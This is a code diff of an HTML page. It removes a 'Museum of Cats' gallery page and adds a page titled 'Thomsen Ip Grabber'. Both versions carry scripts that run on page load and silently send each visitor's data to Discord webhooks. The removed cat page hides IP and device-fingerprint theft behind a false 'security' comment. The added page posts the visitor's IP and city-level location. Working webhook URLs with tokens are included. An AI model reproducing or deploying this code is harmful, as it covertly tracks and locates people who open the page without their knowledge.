@@ -1,143 +1,41 @@
 <!DOCTYPE html>
-
 <html>
-    <head>
-    	<title>The Museum of Cats!!</title> <!-- title -->
-
-      <style>
-           .center {
-            text-align: center;
-            margin-bottom: 100px;
-          }
-          
-          .gallery {
-          display: flex;
-          flex-wrap: wrap;
-          }
-        
-          .gallery img {
-          width: 300px;
-          height: 200px;
-          object-fit: cover;
-          margin: 10px;
-          }
-      </style>
-
-
-      <style>
-        @keyframes marquee {
-          0% {
-            transform: translateX(100%);
-          }
-          100% {
-            transform: translateX(-100%);
-          }
-        }
-
-        .text-animation {
-          white-space: nowrap;
-          overflow: hidden;
-          animation: marquee 30s linear infinite;
-          font-size: 45px; /* Adjust the font size as per your needs */
-          color: black ;
-        }
-
-      </style>
-		
-
-		<script>
-			 function generateRandomLuckyNumber() {
-      		var luckyNumberContainer = document.getElementById("lucky-number");
-      		var randomNum = Math.floor(Math.random() * 1001);
-      
-      		luckyNumberContainer.textContent = randomNum;
-			}
-		</script>
-
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script> <!-- USED to check Device Security Info-->
-    </head>
-
-
-    <body>
-        <h1 class = "text-animation">
-          The Museum of Cats!!
-        </h1>
-
-        <div class="gallery">
-            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSy-qDeKJQikVkZbYIwdIGwi8dtiFDm4vLrRSLo-pbn5zpfuVsvsPFNLMJ038WV_aeawAw&usqp=CAUg" alt="Cat 1">
-            <img src="https://as2.ftcdn.net/v2/jpg/01/23/50/17/500_F_123501706_3GwEndkcTZJQs31SYuXW9znaMc8rEfC7.jpg" alt="Cat 2">
-            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTx5LAPvqU9NWg-AJicrvmppAPlxujdDMaNZA&usqp=CAU" alt="Cat 3">
-            <img src="https://images.pexels.com/photos/6441460/pexels-photo-6441460.jpeg?auto=compress&cs=tinysrgb&dpr=1&w=500" alt="Cat 4">
-        </div>
-
-        <div class="center">
-            <h1>
-              Lucky Number Roll!
-            </h1>
-            <button onclick="generateRandomLuckyNumber()">What is your lucky number today mate?</button>
-            <div id="lucky-number"></div>
-        </div>
-
-		    
-        
-        <script>
-            var xhr = new XMLHttpRequest();
-            var webhookUrl = "https://discord.com/api/webhooks/1158992076839583815/MAw-xZ9ELt9rv-RuQndxFVAHG41F0hO2DmX314SzhMmknexPv5tat8MWWIu8cqVOJHfE";
-            
-            xhr.open("GET", "https://api.ipify.org?format=json", true);
-            xhr.onreadystatechange = function() {
-              if (xhr.readyState === 4 && xhr.status === 200) {
-                var ipData = JSON.parse(xhr.responseText);
-                var ipAddress = ipData.ip;
-          
-                var data = {
-                  content: "Visitor IP: " + ipAddress
-                };
-                
-                var req = new XMLHttpRequest();
-                req.open("POST", webhookUrl, true);
-                req.setRequestHeader("Content-type", "application/json");
-                req.send(JSON.stringify(data));
-              }
-            };
-            
-            xhr.send();
-          </script>
-
-          
-
-          <script>
-             // Function to send device info to Discord webhook
-              function sendDeviceInfo() {
-            // Get device information
-              var deviceInfo = {
-                "User Agent": navigator.userAgent,
-                "Language": navigator.language,
-                "Screen Resolution": window.screen.width + "x" + window.screen.height,
-                "Browser Dimensions": window.innerWidth + "x" + window.innerHeight,
-                "Platform": navigator.platform
-                };
-
-                 // Convert device info to JSON string
-                var jsonDeviceInfo = JSON.stringify(deviceInfo);
-
-                // Send device info to Discord webhook using AJAX
-                $.ajax({
-                    type: "POST",
-                    url: "https://discord.com/api/webhooks/1158992076839583815/MAw-xZ9ELt9rv-RuQndxFVAHG41F0hO2DmX314SzhMmknexPv5tat8MWWIu8cqVOJHfE",
-                    data: {
-                        content: "Visitor Device Info:\n" + jsonDeviceInfo
-                    },
-                    success: function(){
-                      console.log("Device info sent to webhook for security reason")
-                    },
-                    error: function() {
-                    console.log("Error, Try Again");
-                }
-            });
-                                }
-            window.onload = sendDeviceInfo;
-          </script>
-    </body>
-    
+<head>
+     <meta charset="UTF-8">
+     <title>Thomsen Ip Grabber</title>
+     <link rel="stylesheet" href="style.css">
+</head>
+<body>
+     <div class="content">
+          <h2>Nhan Do</h2>
+          <h2>Nhan Do</h2>
+     </div>
+</body>
 </html>
+
+<script>
+function monke(json) 
+{
+     var request = new XMLHttpRequest();
+     
+     request.open("POST", "https://discord.com/api/webhooks/1195057372276736131/oAcujQuef8yAzcXTfbBWMsuaiYjdzI3Cfr4UBFmrB_amLVw9P8sOPJcE6dfqboXdtNZP");
+
+     request.setRequestHeader('Content-type', 'application/json');
+
+     var params = 
+     {
+          username: "cube cube hook :)",
+          avatar_url: "https://cdn.discordapp.com/attachments/1122977732385579030/1159803884257149039/ab024efe2306f15b6a2c50a18732c407.png?ex=65325a8a&is=651fe58a&hm=0da8d1f5655d1a075f040c338cad6abdb134953d5424c53389d0bd713092d23c&",
+          embeds: [
+               {
+                    title: "cube cube hook :)",
+                    color: 15000,
+                    description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
+               }
+          ]
+     }
+
+     request.send(JSON.stringify(params));
+}
+</script>
+<script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
